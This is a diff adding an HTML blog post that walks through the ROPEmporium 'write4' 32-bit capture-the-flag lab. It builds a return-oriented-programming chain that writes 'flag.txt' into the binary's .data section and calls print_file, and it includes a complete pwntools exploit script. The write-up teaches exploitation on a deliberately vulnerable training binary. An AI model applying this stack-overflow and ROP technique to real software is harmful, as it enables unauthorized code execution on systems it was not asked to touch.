@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>ROPEmporium: write4 32-bit | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/write432bit/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>ROPEmporium: write4 32-bit</h1>
+    <time datetime="2021-05-24T19:41:00&#43;02:00">May 24, 2021</time>
+  </header>
+  <h1 id="writeup-of-write-four-write4-on-ropemporium">Writeup of write four [write4] on ROPEmporium</h1>
+<p>Prerequisites: Basic knowledge of assembly, disassembling tools, the previous challenges, and calling convention</p>
+<hr>
+<p>We&rsquo;re told the following: &ldquo;A PLT entry for a function named print_file() exists within the challenge binary,
+simply call it with the name of a file you wish to read (like &lsquo;flag.txt&rsquo;) as the 1st argument. The &lsquo;flag.txt&rsquo; isn&rsquo;t present in the binary&rdquo;</p>
+<p>We need a writeable part of memory, because we need to write the string into the binary.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">0x080483f0</span>]<span style="color:#f92672">&gt;</span> iS
+
+nth paddr        size vaddr       vsize perm name
+
+<span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">0x00001018</span>    <span style="color:#ae81ff">0x8</span> <span style="color:#ae81ff">0x0804a018</span>    <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .data
+</code></pre></div><p>[Other sections have been removed due to easier readability]</p>
+<p>We&rsquo;re going to write out flag into this section. The section has a size of 8, which is perfect for our payload of 8 characters. Originally I used a different section with a larger size, this caused the string not to be null-terminated, and therefore the payload didn&rsquo;t work.</p>
+<p>Now how are we going to write to this section? That&rsquo;s our next problem. We&rsquo;ll need to use a &ldquo;write/what/where&rdquo; gadget, such as: <code>mov [reg], reg</code>
+The gadget moves the value of reg, into the address pointed to by reg. This is what the [] brackets are for.</p>
+<p>We can open the binary with gdb, and look at the usefulGadgets function (addr found with info func)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pwndbg<span style="color:#f92672">&gt;</span> disass usefulGadgets 
+Dump of assembler code <span style="color:#66d9ef">for</span> function usefulGadgets:
+   <span style="color:#ae81ff">0x08048543</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>	mov    DWORD PTR [edi],ebp
+   <span style="color:#ae81ff">0x08048545</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;:</span>	ret    
+</code></pre></div><p>We have a gadget that moves the value from ebp into the address pointed to by edi. Now we need a gadget, that can control the values in the edi and ebp registers. If we remember
+the crucial basic instruction &ldquo;pop&rdquo;, this is a way of setting a registers value. (It does also increment the stackpointer, but we don&rsquo;t care about that right now)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cave@noobpwn:~/binexp/ROP-emperium/write4_32$ ROPgadget --binary write432 | grep pop
+
+0x080485aa : pop edi ; pop ebp ; ret
+</code></pre></div><p>[Other results removed for readability]</p>
+<p>Great! So we have a gadget to set the registers. Now we&rsquo;ll need to put together the ropchain.</p>
+<pre><code>pop_edi_pop_ebp + datasegm + b&quot;flag&quot;
+mov_[edi]_ebp
+
+pop_edi_pop_ebp + datasegm+0x4 + b&quot;.txt&quot;
+mov_[edi]_ebp
+
+print_file + datasegm
+</code></pre><p>It&rsquo;s important to remember that the gadget works as a: <code>mov destination, source</code></p>
+<p>The reason for our +0x4, is that we can only have 4 bytes in an address at once. 1 address is equal to 32 bit, which is the same as 4 bytes.</p>
+<p>Now we just need the print_file call, where we need this datasegm (beginning) to be the argument! And flag!:)</p>
+<p>Exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elfPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./write432&#34;</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>
+
+
+print_file<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x08048538</span>)
+datasegm<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0804a018</span>
+
+mov<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x08048543</span>) <span style="color:#75715e">#mov [edi], ebp</span>
+pop<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x080485aa</span>) <span style="color:#75715e">#pop edi; pop ebp</span>
+
+gdbscript<span style="color:#f92672">=</span> f<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">c
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript)
+
+mnm <span style="color:#f92672">=</span> cyclic_gen()
+mnm <span style="color:#f92672">=</span> mnm<span style="color:#f92672">.</span>get(<span style="color:#ae81ff">80</span>)
+point<span style="color:#f92672">=</span>cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;laaa&#34;</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+<span style="color:#75715e">#6161616c is at the return or laaa</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+    
+    payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point <span style="color:#75715e">#padding</span>
+    payload<span style="color:#f92672">+=</span>pop<span style="color:#f92672">+</span>p32(datasegm)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag&#34;</span> 
+    payload<span style="color:#f92672">+=</span>mov 
+    payload<span style="color:#f92672">+=</span>pop<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.txt&#34;</span> 
+    payload<span style="color:#f92672">+=</span>mov 
+    payload<span style="color:#f92672">+=</span>print_file<span style="color:#f92672">+</span>p32(datasegm) <span style="color:#75715e">#Call print_file with the memory as argument</span>
+
+    io<span style="color:#f92672">.</span>send(payload)
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2048</span>))
+    io<span style="color:#f92672">.</span>interactive()
+
+main()
+</code></pre></div>
+</article>
+
+
+
+</html>
